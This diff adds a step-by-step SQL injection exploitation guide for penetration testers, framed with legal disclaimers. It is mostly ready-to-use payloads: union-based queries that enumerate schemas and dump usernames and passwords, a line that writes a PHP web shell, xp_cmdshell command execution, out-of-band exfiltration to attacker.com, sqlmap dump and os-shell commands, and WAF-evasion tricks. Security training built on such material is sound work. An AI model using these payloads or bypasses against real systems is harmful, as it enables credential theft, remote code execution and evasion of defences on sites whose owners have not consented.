@@ -1,0 +1,277 @@
+This guide is provided for educational purposes only, to help individuals understand and defend against web vulnerabilities. **Unauthorized access to computer systems is illegal and unethical. Always obtain explicit written permission from the owner before conducting any security testing.**
+
+---
+
+# Detailed SQL Injection Exploitation Guide for Penetration Testers
+
+## 1. Introduction to SQL Injection
+
+SQL Injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an input field for execution (e.g., to dump database contents to the attacker). It is one of the most severe and common web application vulnerabilities, often leading to full compromise of the database and sometimes even the underlying system.
+
+**Impact:**
+*   Bypassing authentication.
+*   Retrieving, modifying, or deleting sensitive data (e.g., user credentials, financial records).
+*   Executing administrative operations on the database.
+*   Retrieving files from the server (e.g., `/etc/passwd`).
+*   Writing files to the server (e.g., web shells for Remote Code Execution - RCE).
+*   Executing operating system commands (in some configurations, like MySQL's `sys_exec`).
+
+## 2. Prerequisites
+
+*   Basic understanding of SQL (SELECT, UNION, ORDER BY, common functions).
+*   Familiarity with HTTP methods (GET, POST), headers, and URL encoding.
+*   Knowledge of common database systems (MySQL, PostgreSQL, MSSQL, Oracle).
+*   Web proxy tool (e.g., Burp Suite, OWASP ZAP).
+*   Command-line proficiency.
+
+## 3. Step-by-Step Exploitation Guide
+
+We will focus primarily on **Union-Based SQLi** as it's the most common and illustrative, then briefly cover other types.
+
+**Target Scenario:** A web application displays product details based on an `id` parameter: `http://example.com/products.php?id=123`.
+
+### Step 3.1: Identifying SQL Injection Vulnerability
+
+This is the initial phase where you confirm the existence of an SQLi vulnerability.
+
+**Techniques:**
+
+1.  **Error-Based SQLi:** Injecting special characters to cause a database error.
+    *   **Payloads:**
+        *   `id=1'` (single quote)
+        *   `id=1"` (double quote)
+        *   `id=1)` (parenthesis)
+        *   `id=1%27` (URL encoded single quote)
+    *   **Expected Behavior:** The application throws a database error (e.g., "SQL syntax error," "Unclosed quotation mark," "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given"). This error message often reveals the database type and even parts of the query.
+    *   **Example:** `http://example.com/products.php?id=1'` might show:
+        `You have an error in your SQL syntax; check the manual... near ''1''' at line 1` (MySQL)
+
+2.  **Boolean-Based Blind SQLi:** Observing differences in application responses (true/false) without direct error messages.
+    *   **Payloads:**
+        *   `id=1 AND 1=1` (always true)
+        *   `id=1 AND 1=2` (always false)
+    *   **Expected Behavior:**
+        *   `1=1`: Application behaves normally (shows content for ID 1).
+        *   `1=2`: Application returns different content (e.g., "no products found," blank page, different number of results).
+    *   **Example:**
+        *   `http://example.com/products.php?id=1 AND 1=1` -> Shows product 1.
+        *   `http://example.com/products.php?id=1 AND 1=2` -> Shows no product.
+
+3.  **Time-Based Blind SQLi:** Observing delays in application responses. Useful when no error messages or distinct true/false content changes are present.
+    *   **Payloads (MySQL/PostgreSQL):**
+        *   `id=1 AND SLEEP(5)`
+        *   `id=1 UNION SELECT SLEEP(5)` (If Union-based is an option)
+    *   **Payloads (MSSQL):**
+        *   `id=1; WAITFOR DELAY '0:0:5'`
+    *   **Expected Behavior:** The server response is delayed by the specified time (e.g., 5 seconds).
+    *   **Example:** `http://example.com/products.php?id=1 AND SLEEP(5)` -> Page loads after 5 seconds.
+
+### Step 3.2: Determining the Number of Columns
+
+This step is crucial for Union-Based SQLi. You need to know how many columns the original query selects to match them with your `UNION SELECT` statement.
+
+**Technique: `ORDER BY` Clause**
+
+*   **Payloads:** Increment the number until an error occurs.
+    *   `id=1 ORDER BY 1--+`
+    *   `id=1 ORDER BY 2--+`
+    *   `id=1 ORDER BY N--+` (where `N` is your guess)
+*   **Expected Behavior:**
+    *   If `ORDER BY N` works, the query has at least `N` columns.
+    *   If `ORDER BY N+1` causes an error (e.g., "Unknown column N+1 in 'order clause'"), then the number of columns is `N`.
+*   **Example:**
+    *   `http://example.com/products.php?id=1 ORDER BY 5--+` (Works)
+    *   `http://example.com/products.php?id=1 ORDER BY 6--+` (Error: Unknown column '6')
+    *   **Conclusion:** There are 5 columns.
+
+**Alternative (less common for discovery, more for confirmation): `UNION SELECT NULL, NULL, ...`**
+
+*   **Payload:** `id=-1 UNION SELECT NULL, NULL, NULL, NULL, NULL--+`
+    *   **Note:** Use `id=-1` to ensure the original query returns no rows, allowing the `UNION SELECT` results to be displayed. If `id` is an integer, `-1` often works. If it's a string, use `id='nonexistent'`.
+*   **Expected Behavior:** If the number of `NULL`s matches the number of columns, the page loads normally. If not, an error occurs.
+
+### Step 3.3: Determining String-Compatible Columns (for displaying data)
+
+Once you know the number of columns, you need to find which of them can display string data.
+
+**Technique: Replacing `NULL`s with strings**
+
+*   **Payload:** `id=-1 UNION SELECT 'A', 'B', 'C', NULL, NULL--+`
+    *   Replace `NULL`s with arbitrary strings ('A', 'B', 'C', etc.) one by one or in blocks.
+*   **Expected Behavior:** When you hit a string-compatible column, your injected string ('A', 'B', 'C') will appear on the web page. This is where you'll display extracted data.
+*   **Example:**
+    *   `http://example.com/products.php?id=-1 UNION SELECT NULL, NULL, 'VULNERABLE_HERE', NULL, NULL--+`
+    *   Page output contains "VULNERABLE_HERE". This means the 3rd column is string-compatible.
+
+### Step 3.4: Extracting Database Information
+
+Now that you have a display point, you can start extracting crucial database information.
+
+*   **MySQL/PostgreSQL Payloads (using the 3rd column as display):**
+    *   **Database Version:** `id=-1 UNION SELECT NULL, NULL, VERSION(), NULL, NULL--+`
+    *   **Current User:** `id=-1 UNION SELECT NULL, NULL, USER(), NULL, NULL--+`
+    *   **Current Database Name:** `id=-1 UNION SELECT NULL, NULL, DATABASE(), NULL, NULL--+`
+    *   **Hostname:** `id=-1 UNION SELECT NULL, NULL, @@HOSTNAME, NULL, NULL--+` (MySQL)
+    *   **Other useful functions:** `@@datadir` (data directory), `@@basedir` (installation directory).
+
+*   **MSSQL Payloads:**
+    *   **Database Version:** `id=-1 UNION SELECT NULL, NULL, @@VERSION, NULL, NULL--+`
+    *   **Current User:** `id=-1 UNION SELECT NULL, NULL, SYSTEM_USER, NULL, NULL--+`
+    *   **Current Database Name:** `id=-1 UNION SELECT NULL, NULL, DB_NAME(), NULL, NULL--+`
+
+*   **Oracle Payloads:**
+    *   **Database Version:** `id=-1 UNION SELECT NULL, NULL, banner, NULL, NULL FROM v$version WHERE ROWNUM=1--+`
+    *   **Current User:** `id=-1 UNION SELECT NULL, NULL, user, NULL, NULL FROM DUAL--+`
+    *   **Current Database Name:** `id=-1 UNION SELECT NULL, NULL, global_name, NULL, NULL FROM global_name--+`
+
+### Step 3.5: Enumerating Tables
+
+This step involves querying the database's schema (metadata) to list available tables.
+
+**MySQL/PostgreSQL (using `information_schema`):**
+
+*   **List all tables in the current database:**
+    `id=-1 UNION SELECT NULL, NULL, GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE()--+`
+    *   `GROUP_CONCAT` is essential to display multiple rows in a single column.
+*   **List tables from a specific database (e.g., `mysql`):**
+    `id=-1 UNION SELECT NULL, NULL, GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema = 'mysql'--+`
+
+**MSSQL (using `information_schema` or `sys` views):**
+
+*   **List all tables in the current database:**
+    `id=-1 UNION SELECT NULL, NULL, STUFF((SELECT ',' + table_name FROM information_schema.tables WHERE table_catalog = DB_NAME() FOR XML PATH('')), 1, 1, ''), NULL, NULL--+`
+    *   `STUFF` and `FOR XML PATH('')` are used for string aggregation in MSSQL, similar to `GROUP_CONCAT`.
+
+**Oracle:**
+
+*   **List tables owned by current user:**
+    `id=-1 UNION SELECT NULL, NULL, (SELECT table_name FROM all_tables WHERE ROWNUM=1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY), NULL, NULL FROM DUAL--+`
+    *   Oracle requires more complex pagination for multiple results, or iterating through `ROWNUM`.
+
+**Common Table Names to look for:** `users`, `admin`, `accounts`, `credentials`, `members`, `auth`.
+
+### Step 3.6: Enumerating Columns
+
+Once you've identified interesting tables (e.g., `users`), you need to find the column names within them.
+
+**MySQL/PostgreSQL (using `information_schema`):**
+
+*   **List columns for a specific table (e.g., `users`):**
+    `id=-1 UNION SELECT NULL, NULL, GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = DATABASE()--+`
+
+**MSSQL (using `information_schema` or `sys` views):**
+
+*   **List columns for a specific table (e.g., `users`):**
+    `id=-1 UNION SELECT NULL, NULL, STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name = 'users' AND table_catalog = DB_NAME() FOR XML PATH('')), 1, 1, ''), NULL, NULL--+`
+
+**Oracle:**
+
+*   **List columns for a specific table (e.g., `users`):**
+    `id=-1 UNION SELECT NULL, NULL, (SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' AND ROWNUM=1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY), NULL, NULL FROM DUAL--+`
+
+**Common Column Names to look for:** `username`, `user`, `passwd`, `password`, `pass`, `hash`, `email`, `credit_card_number`, `ssn`, `id`.
+
+### Step 3.7: Extracting Data
+
+Finally, retrieve the sensitive data from the identified tables and columns.
+
+**MySQL/PostgreSQL:**
+
+*   **Extract `username` and `password` from the `users` table:**
+    `id=-1 UNION SELECT NULL, NULL, GROUP_CONCAT(username,0x3a,password), NULL, NULL FROM users--+`
+    *   `0x3a` is the hexadecimal representation of a colon (`:`), used as a separator between username and password for readability.
+
+**MSSQL:**
+
+*   **Extract `username` and `password` from the `users` table:**
+    `id=-1 UNION SELECT NULL, NULL, STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')), 1, 1, ''), NULL, NULL--+`
+
+**Oracle:**
+
+*   **Extract `username` and `password` from the `users` table:**
+    `id=-1 UNION SELECT NULL, NULL, (SELECT username || ':' || password FROM users WHERE ROWNUM=1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY), NULL, NULL FROM DUAL--+`
+
+### Step 3.8: Advanced Exploitation (Briefly)
+
+*   **File Operations (MySQL):**
+    *   `LOAD_FILE('/etc/passwd')`: Read arbitrary files.
+    *   `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`: Write a web shell (requires `FILE` privilege and appropriate permissions/configuration).
+*   **Operating System Command Execution:**
+    *   **MySQL:** If `sys_exec` or `lib_mysqludf_sys` is enabled and you have `FILE` privilege, you might be able to create User Defined Functions (UDFs) to execute OS commands.
+    *   **MSSQL:** `xp_cmdshell` procedure (often disabled by default for security).
+*   **Out-of-Band (OOB) SQLi:** When direct data retrieval is blocked, data can be exfiltrated via external channels (DNS, HTTP requests).
+    *   **MySQL:** `id=1 UNION SELECT NULL, NULL, LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.attacker.com\\share')), NULL, NULL--+` (Causes an SMB/DNS lookup with the version info).
+    *   **MSSQL:** `id=1; EXEC master..xp_cmdshell 'nslookup ' + @@version + '.attacker.com'`
+
+## 4. Tools for SQL Injection
+
+While manual testing is crucial for understanding, automated tools significantly speed up and simplify the process.
+
+*   **SQLMap:** The undisputed king of SQL Injection automation.
+    *   **Features:** Detection, database fingerprinting, enumeration (databases, tables, columns, data), data dumping, file access (read/write), OS command execution, out-of-band techniques.
+    *   **Basic Usage:** `sqlmap -u "http://example.com/products.php?id=123"`
+    *   **Enumeration:**
+        *   `sqlmap -u "http://example.com/products.php?id=123" --dbs` (List databases)
+        *   `sqlmap -u "http://example.com/products.php?id=123" -D <db_name> --tables` (List tables in a DB)
+        *   `sqlmap -u "http://example.com/products.php?id=123" -D <db_name> -T <table_name> --columns` (List columns in a table)
+        *   `sqlmap -u "http://example.com/products.php?id=123" -D <db_name> -T <table_name> -C <column1,column2> --dump` (Dump data)
+    *   **Advanced:** `--os-shell`, `--file-read`, `--file-write`, `--cookie`, `--data`, `--proxy`, `--level`, `--risk`.
+
+*   **Burp Suite (Professional):**
+    *   **Proxy:** Intercept and modify requests.
+    *   **Repeater:** Manually test payloads quickly.
+    *   **Intruder:** Fuzz parameters with a list of SQLi payloads (useful for blind SQLi and WAF bypass testing).
+    *   **Decoder:** URL encode/decode payloads.
+    *   **Collaborator (OOB):** Generate unique OOB payloads for blind SQLi.
+
+*   **OWASP ZAP:** Similar to Burp Suite, but open-source. Includes a scanner that can identify some SQLi vulnerabilities.
+
+## 5. Common WAF Bypass Techniques
+
+Web Application Firewalls (WAFs) attempt to detect and block malicious SQLi payloads. Bypass techniques aim to obfuscate the payload so it passes through the WAF but is still interpreted by the database.
+
+*   **Comments:** Inject comments to break up keywords or hide parts of the query.
+    *   `UNION SELECT` -> `UNI/**/ON SELECT`
+    *   `' OR 1=1--+` -> `' OR 1=1/*` (different comment style)
+
+*   **Case Variation:** Change the casing of keywords.
+    *   `SELECT` -> `sElEcT`, `SeLeCt`
+
+*   **Whitespace Alternatives:** Use alternative characters for whitespace.
+    *   `%0A` (Newline), `%0B` (Vertical Tab), `%0C` (Form Feed), `%0D` (Carriage Return)
+    *   `SELECT` `UNION` -> `SELECT%0AUNION`
+
+*   **URL Encoding / Double Encoding:** Encode characters multiple times.
+    *   `'` -> `%27` -> `%2527` (double encoded)
+    *   `=` -> `%3D` -> `%253D`
+
+*   **String Concatenation / Char() function:** Build strings dynamically.
+    *   `'union'` -> `CONCAT('u','n','i','o','n')`
+    *   `'SELECT'` -> `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)`
+
+*   **Inline Query Evaluation:** Use subqueries to bypass keyword filters.
+    *   `SELECT * FROM (SELECT 'union' AS a) b JOIN (SELECT 'select' AS c) d ON 1=1` (More complex example)
+
+*   **Generic Obfuscation:**
+    *   `!`, `@`, `#`, `$` characters (some databases tolerate them, WAFs might not expect them).
+    *   `SELECT user() FROM DUAL` (Oracle specific) -> `SEL%23%0AECT user() FRO%23%0AM DUAL`
+
+*   **HTTP Parameter Pollution (HPP):** Provide multiple values for the same parameter. The backend might process only one or combine them, potentially bypassing filters.
+    *   `id=1&id=UNION SELECT 1,2,3` (The server might use the last one, or combine them depending on framework)
+
+*   **Polyglot Payloads:** Payloads that are valid in multiple contexts or for multiple bypass techniques simultaneously.
+
+**WAF Bypass Strategy:**
+1.  Identify the WAF (e.g., via HTTP headers like `Server`, `X-Powered-By`, or specific WAF headers).
+2.  Start with simple payloads and escalate complexity.
+3.  Use Burp Intruder to rapidly test combinations of bypass techniques.
+4.  Observe WAF responses (e.g., "Access Denied," specific block pages, redirect loops).
+
+## 6. Summary
+
+SQL Injection remains a critical vulnerability that can lead to severe data breaches and system compromise. As a penetration tester, understanding the various types of SQLi, how to manually detect and exploit them step-by-step, and how to leverage automated tools like SQLMap is essential. Furthermore, the ability to bypass WAFs using creative obfuscation techniques is crucial for successful real-world engagements.
+
+Always prioritize ethical hacking principles: obtain explicit permission, define the scope, and ensure your actions are legal and responsible. SQL Injection is a powerful technique, and with great power comes great responsibility.
+
+---
+**Disclaimer Revisited:** This guide is intended solely for educational purposes and for use in authorized security testing environments. Engaging in any unauthorized activities against computer systems is illegal and unethical. The author disclaims any responsibility for misuse of this information. Always hack responsibly and legally.
